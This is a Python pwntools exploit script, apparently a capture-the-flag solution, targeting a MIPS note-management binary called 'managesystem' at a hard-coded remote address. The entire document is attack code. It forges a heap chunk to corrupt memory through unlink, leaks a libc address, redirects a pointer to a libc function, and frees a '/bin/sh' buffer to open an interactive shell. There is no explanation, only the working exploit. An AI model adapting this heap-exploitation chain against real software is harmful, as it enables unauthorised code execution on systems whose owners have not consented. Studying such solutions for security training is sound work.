from pwn import *
import time
import sys

def add(l,note):
    p.sendlineafter(">> \n","1")
    p.sendlineafter(": \n",str(l))
    p.sendafter(": \n",note)

def delete(index):
    p.sendlineafter(">> \n","2")
    p.sendlineafter(": \n",str(index))

def edit(l,note):
    p.sendlineafter(">> \n","3")
    p.sendlineafter(": \n",str(l))
    p.sendafter(": \n",note)

def show(index):
    p.sendlineafter(">> \n","4")
    p.sendlineafter(": \n",str(index))

context.log_level="debug"
if len(sys.argv)>1:
   p=process(["./qemu-mipsel-static","-g","1234","-L","./","./managesystem"])
else:
     p=remote("183.129.189.62",61403)
add(0x64,"kirin")
add(0x64,"aaaa")
add(0x64,"bbbb")
add(0x64,"cccc")
add(0x64,"dddd")
edit(2,p32(0)+p32(0x61)+p32(0x411834)+p32(0x411838)+"\x00"*0x50+p32(0x60)+p32(0x68))
delete(3)
edit(2,p32(0x4117B4))
show(1)
p.recvuntil("info: ")
libc=u32(p.recv(4))-0x00056b68
print hex(libc)
edit(0,"/bin/sh\x00")
edit(1,p32(libc+0x5f8f0))
delete(0)
p.interactive()
